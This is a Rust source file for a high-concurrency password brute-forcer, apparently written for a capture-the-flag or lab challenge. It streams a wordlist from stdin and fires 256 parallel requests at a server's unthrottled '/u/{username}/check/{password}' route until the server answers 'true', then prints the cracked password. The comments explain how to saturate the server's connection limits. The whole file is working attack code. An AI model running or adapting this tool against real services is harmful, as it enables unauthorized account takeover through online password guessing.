use std::{pin::pin, process};

use anyhow::{Context, Result, anyhow, ensure};
use clap::Parser;
use futures::{StreamExt, stream};
use indicatif::{ProgressBar, ProgressStyle};
use reqwest::ClientBuilder;
use tokio::io::{AsyncBufReadExt, BufReader};
use tracing::debug;
use url::Url;

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Cli {
    /// The username to check against.
    #[arg(short, long)]
    username: String,

    #[expect(clippy::doc_markdown)]
    /// The hostname for the challenge, e.g. (http://localhost:3000).
    #[arg(short = 'H', long)]
    hostname: Url,
}

// Password checking is network-bound: the client spends its time waiting on
// round-trips, not the CPU, so concurrency should track how many requests the
// server will service at once rather than the core count. The check route is
// unthrottled and Caddy multiplexes these tiny requests over a single HTTP/2
// connection, whose stream limit is Go's default of 250. 256 saturates that
// ceiling while staying well under the open-file limit if the connection ever
// falls back to HTTP/1.1, where each request needs its own socket.
const CONCURRENCY: usize = 256;

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt::init();
    let cli = Cli::parse();

    let client = ClientBuilder::new().build()?;

    // The input is streamed, so the total is unknown until we reach the end. A
    // spinner reports rate and count without a percentage or ETA.
    let pb = ProgressBar::new_spinner();
    pb.set_style(ProgressStyle::with_template(
        "{spinner:.green} [{elapsed_precise}] {human_pos} checked ({per_sec})",
    )?);

    // Read stdin line by line and let buffer_unordered pull lines on demand, so
    // at most CONCURRENCY passwords are resident no matter how large the file is.
    // Tokio's stdin hands the blocking reads to its blocking pool, so a slow
    // pipe never stalls a worker that is driving requests.
    let lines = stream::unfold(
        BufReader::new(tokio::io::stdin()).lines(),
        |mut lines| async {
            lines
                .next_line()
                .await
                .transpose()
                .map(|line| (line, lines))
        },
    );

    let bodies = lines
        .map(|line| {
            let client = &client;
            let hostname = cli.hostname.clone();
            let username = cli.username.clone();
            async move {
                let pass = line.context("reading passwords from stdin")?;
                let url = format!("{hostname}u/{username}/check/{pass}");
                let resp = client
                    .get(url)
                    .send()
                    .await
                    .with_context(|| format!("checking {pass:?}"))?;
                let status = resp.status();
                ensure!(
                    status.is_success(),
                    "checking {pass:?}: server answered {status}"
                );
                let text = resp
                    .text()
                    .await
                    .with_context(|| format!("checking {pass:?}"))?;
                anyhow::Ok((pass, text))
            }
        })
        .buffer_unordered(CONCURRENCY);

    // Take every response that has already arrived rather than one per
    // wakeup: under load the batches grow, so the progress update and the
    // scan for `true` cost once per batch instead of once per password.
    let mut batches = pin!(bodies.ready_chunks(CONCURRENCY));
    while let Some(batch) = batches.next().await {
        pb.inc(batch.len() as u64);
        for result in batch {
            // A guess that never got an answer might have been the password,
            // so carrying on could end in a false "didn't find it". Stop and
            // say why instead.
            let (pass, body) = result.inspect_err(|_| pb.finish_and_clear())?;
            if body == "true" {
                pb.finish_and_clear();
                println!("Password is: {pass}");
                process::exit(0);
            }
            debug!("{pass}: {body}");
        }
    }

    pb.finish_and_clear();
    Err(anyhow!("Didn't find the password :("))
}
